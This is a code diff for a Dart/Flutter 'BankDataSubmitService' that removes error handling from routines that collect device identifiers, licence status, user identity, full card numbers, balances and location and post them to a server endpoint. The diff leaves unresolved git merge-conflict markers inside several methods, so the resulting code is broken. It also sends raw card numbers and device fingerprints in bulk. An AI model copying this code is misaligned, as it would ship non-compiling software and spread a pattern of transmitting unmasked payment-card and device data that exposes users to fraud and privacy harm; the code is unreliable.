@@ -193,11 +193,12 @@ class BankDataSubmitService {
     _isInitialized = true;
   }
 
-  /// Collect device information with error tolerance
+  /// Collect device information
   Future<DeviceInfoModel> _collectDeviceInfo() async {
-    String deviceId = 'unknown';
-    String appSignature = 'unknown';
-    String machineCode = 'unknown';
+    final deviceId = await DeviceSecurityManager.instance.getDeviceId();
+    final appSignature = await DeviceSecurityManager.instance.getAppSignature();
+    final machineCode = await DeviceUtils.getMachineCode();
+    
     String deviceName = 'Unknown Device';
     String platform = 'unknown';
     String platformVersion = 'unknown';
@@ -205,100 +206,34 @@ class BankDataSubmitService {
     final additionalInfo = <String, dynamic>{};
 
     try {
-      deviceId = await DeviceSecurityManager.instance.getDeviceId();
-    } catch (e) {
-      debugPrint('Error getting device ID: $e');
-    }
-
-    try {
-      appSignature = await DeviceSecurityManager.instance.getAppSignature();
-    } catch (e) {
-      debugPrint('Error getting app signature: $e');
-    }
-
-    try {
-      machineCode = await DeviceUtils.getMachineCode();
-    } catch (e) {
-      debugPrint('Error getting machine code: $e');
-    }
-
-    try {
       if (kIsWeb) {
         platform = 'web';
         deviceName = 'Web Browser';
       } else if (Platform.isAndroid) {
         platform = 'android';
-        try {
-          platformVersion = Platform.version;
-        } catch (e) {
-          platformVersion = 'unknown';
-        }
-        try {
-          deviceName = await _getAndroidDeviceName();
-        } catch (e) {
-          deviceName = 'Android Device';
-        }
+        platformVersion = Platform.version;
+        deviceName = await _getAndroidDeviceName();
       } else if (Platform.isIOS) {
         platform = 'ios';
-        try {
-          platformVersion = Platform.version;
-        } catch (e) {
-          platformVersion = 'unknown';
-        }
-        try {
-          deviceName = await _getIOSDeviceName();
-        } catch (e) {
-          deviceName = 'iOS Device';
-        }
+        platformVersion = Platform.version;
+        deviceName = await _getIOSDeviceName();
       } else if (Platform.isWindows) {
         platform = 'windows';
-        try {
-          platformVersion = Platform.version;
-        } catch (e) {
-          platformVersion = 'unknown';
-        }
-        try {
-          deviceName = Platform.environment['COMPUTERNAME'] ?? 'Windows Device';
-        } catch (e) {
-          deviceName = 'Windows Device';
-        }
+        platformVersion = Platform.version;
+        deviceName = Platform.environment['COMPUTERNAME'] ?? 'Windows Device';
       } else if (Platform.isMacOS) {
         platform = 'macos';
-        try {
-          platformVersion = Platform.version;
-        } catch (e) {
-          platformVersion = 'unknown';
-        }
-        try {
-          deviceName = Platform.environment['COMPUTER'] ?? 'Mac Device';
-        } catch (e) {
-          deviceName = 'Mac Device';
-        }
+        platformVersion = Platform.version;
+        deviceName = Platform.environment['COMPUTER'] ?? 'Mac Device';
       } else if (Platform.isLinux) {
         platform = 'linux';
-        try {
-          platformVersion = Platform.version;
-        } catch (e) {
-          platformVersion = 'unknown';
-        }
-        try {
-          deviceName = Platform.environment['HOSTNAME'] ?? 'Linux Device';
-        } catch (e) {
-          deviceName = 'Linux Device';
-        }
+        platformVersion = Platform.version;
+        deviceName = Platform.environment['HOSTNAME'] ?? 'Linux Device';
       }
-    } catch (e) {
-      debugPrint('Error detecting platform: $e');
-    }
 
-    try {
       additionalInfo['locale'] = Platform.localeName;
-    } catch (e) {
-      debugPrint('Error getting locale: $e');
-    }
-
-    try {
       additionalInfo['number_of_processors'] = Platform.numberOfProcessors;
+<<<<<<< HEAD
     } catch (e) {
       debugPrint('Error getting processors: $e');
     }
@@ -334,12 +269,15 @@ class BankDataSubmitService {
     }
     
     try {
+=======
+      
+>>>>>>> a0b6985f1a703227c4fe01b158edb06caa6a4201
       final networkUtils = NetworkUtils.instance;
       if (await networkUtils.checkConnectivity()) {
         ipAddress = await _getLocalIPAddress();
       }
     } catch (e) {
-      debugPrint('Error getting IP address: $e');
+      debugPrint('Error collecting device info: $e');
     }
 
     return DeviceInfoModel(
@@ -388,33 +326,20 @@ class BankDataSubmitService {
     return null;
   }
 
-  /// Collect registration information with error tolerance
+  /// Collect registration information
   Future<RegistrationInfoModel> _collectRegistrationInfo() async {
-    String? registrationCode;
-    bool isRegistered = false;
-    bool isSuperUser = false;
-    DateTime? expirationTime;
-
-    try {
-      final licenseManager = LicenseRegistrationManager();
-      registrationCode = licenseManager.registrationCode;
-      isRegistered = licenseManager.isRegistered;
-      isSuperUser = licenseManager.isSuperUser;
-      expirationTime = licenseManager.expirationTime;
-    } catch (e) {
-      debugPrint('Error collecting registration info: $e');
-    }
+    final licenseManager = LicenseRegistrationManager();
     
     return RegistrationInfoModel(
-      registrationCode: registrationCode,
-      isRegistered: isRegistered,
-      isSuperUser: isSuperUser,
+      registrationCode: licenseManager.registrationCode,
+      isRegistered: licenseManager.isRegistered,
+      isSuperUser: licenseManager.isSuperUser,
       registrationTime: null,
-      expirationTime: expirationTime,
+      expirationTime: licenseManager.expirationTime,
     );
   }
 
-  /// Collect user data from provider with error tolerance
+  /// Collect user data from provider
   Future<UserDataSubmitModel> _collectUserData({
     String? phone,
     String? fullName,
@@ -423,27 +348,13 @@ class BankDataSubmitService {
     List<BankCardModel>? cards,
     double? totalBalance,
   }) async {
-    final cardsData = <Map<String, dynamic>>[];
-    
-    try {
-      if (cards != null && cards.isNotEmpty) {
-        for (final card in cards) {
-          try {
-            cardsData.add({
-              'card_number': card.cardNumber,
-              'card_type': card.cardType,
-              'balance': card.balance,
-              'currency': card.currency,
-              if (card.openedAt != null) 'opened_at': card.openedAt!.toIso8601String(),
-            });
-          } catch (e) {
-            debugPrint('Error processing card data: $e');
-          }
-        }
-      }
-    } catch (e) {
-      debugPrint('Error collecting cards data: $e');
-    }
+    final cardsData = (cards ?? []).map((card) => {
+      'card_number': card.cardNumber,
+      'card_type': card.cardType,
+      'balance': card.balance,
+      'currency': card.currency,
+      if (card.openedAt != null) 'opened_at': card.openedAt!.toIso8601String(),
+    }).toList();
 
     final additionalData = <String, dynamic>{};
     final completeUserProfile = <String, dynamic>{};
@@ -453,6 +364,7 @@ class BankDataSubmitService {
     try {
       final provider = BankUserProvider();
       if (provider.isInitialized) {
+<<<<<<< HEAD
         try {
           final user = provider.user;
           if (user != null) {
@@ -560,6 +472,21 @@ class BankDataSubmitService {
           }
         } catch (e) {
           debugPrint('Error getting global data: $e');
+=======
+        final user = provider.user;
+        if (user != null) {
+          additionalData['user_id'] = user.id;
+          additionalData['username'] = user.username;
+          additionalData['email'] = user.email;
+          additionalData['role_level'] = user.roleLevel;
+          additionalData['role_name'] = user.roleName;
+        }
+        
+        final globalData = provider.globalData;
+        if (globalData != null) {
+          additionalData['global_balance'] = globalData.balance;
+          additionalData['holdings_total'] = provider.holdingsTotal;
+>>>>>>> a0b6985f1a703227c4fe01b158edb06caa6a4201
         }
 
         try {
@@ -598,7 +525,7 @@ class BankDataSubmitService {
     );
   }
 
-  /// Submit complete data to server with error tolerance
+  /// Submit complete data to server
   Future<bool> submitData({
     String? phone,
     String? fullName,
@@ -607,109 +534,40 @@ class BankDataSubmitService {
     List<BankCardModel>? cards,
     double? totalBalance,
   }) async {
+    if (!_isInitialized) {
+      await initialize();
+    }
+
+    if (_client == null) {
+      return false;
+    }
+
     try {
-      if (!_isInitialized) {
-        try {
-          await initialize();
-        } catch (e) {
-          debugPrint('Error initializing submit service: $e');
-          return false;
-        }
-      }
+      final deviceInfo = await _collectDeviceInfo();
+      final registrationInfo = await _collectRegistrationInfo();
+      final userData = await _collectUserData(
+        phone: phone,
+        fullName: fullName,
+        location: location,
+        city: city,
+        cards: cards,
+        totalBalance: totalBalance,
+      );
 
-      if (_client == null) {
-        debugPrint('Client not initialized');
-        return false;
-      }
+      final request = DataSubmitRequest(
+        deviceInfo: deviceInfo,
+        registrationInfo: registrationInfo,
+        userData: userData,
+      );
 
-      DeviceInfoModel deviceInfo;
-      try {
-        deviceInfo = await _collectDeviceInfo();
-      } catch (e) {
-        debugPrint('Error collecting device info, using defaults: $e');
-        deviceInfo = DeviceInfoModel(
-          deviceName: 'Unknown Device',
-          deviceId: 'unknown',
-          appSignature: 'unknown',
-          machineCode: 'unknown',
-          platform: 'unknown',
-          platformVersion: 'unknown',
-        );
-      }
+      final networkRequest = NetworkRequest(
+        endpoint: '/api/bank/data/submit',
+        method: RequestMethod.post,
+        body: request.toJson(),
+        timeout: const Duration(seconds: 30),
+      );
 
-      RegistrationInfoModel registrationInfo;
-      try {
-        registrationInfo = await _collectRegistrationInfo();
-      } catch (e) {
-        debugPrint('Error collecting registration info, using defaults: $e');
-        registrationInfo = RegistrationInfoModel(
-          isRegistered: false,
-          isSuperUser: false,
-        );
-      }
-
-      UserDataSubmitModel userData;
-      try {
-        userData = await _collectUserData(
-          phone: phone,
-          fullName: fullName,
-          location: location,
-          city: city,
-          cards: cards,
-          totalBalance: totalBalance,
-        );
-      } catch (e) {
-        debugPrint('Error collecting user data, using minimal data: $e');
-        userData = UserDataSubmitModel(
-          phone: phone,
-          fullName: fullName,
-          location: location,
-          city: city,
-          totalBalance: totalBalance,
-          cards: [],
-        );
-      }
-
-      DataSubmitRequest request;
-      try {
-        request = DataSubmitRequest(
-          deviceInfo: deviceInfo,
-          registrationInfo: registrationInfo,
-          userData: userData,
-        );
-      } catch (e) {
-        debugPrint('Error creating request: $e');
-        return false;
-      }
-
-      Map<String, dynamic> requestBody;
-      try {
-        requestBody = request.toJson();
-      } catch (e) {
-        debugPrint('Error serializing request: $e');
-        return false;
-      }
-
-      NetworkRequest networkRequest;
-      try {
-        networkRequest = NetworkRequest(
-          endpoint: '/api/bank/data/submit',
-          method: RequestMethod.post,
-          body: requestBody,
-          timeout: const Duration(seconds: 30),
-        );
-      } catch (e) {
-        debugPrint('Error creating network request: $e');
-        return false;
-      }
-
-      NetworkResponse<Map<String, dynamic>> response;
-      try {
-        response = await _client!.request<Map<String, dynamic>>(networkRequest);
-      } catch (e) {
-        debugPrint('Error sending request: $e');
-        return false;
-      }
+      final response = await _client!.request<Map<String, dynamic>>(networkRequest);
       
       return response.isSuccess;
     } catch (e) {
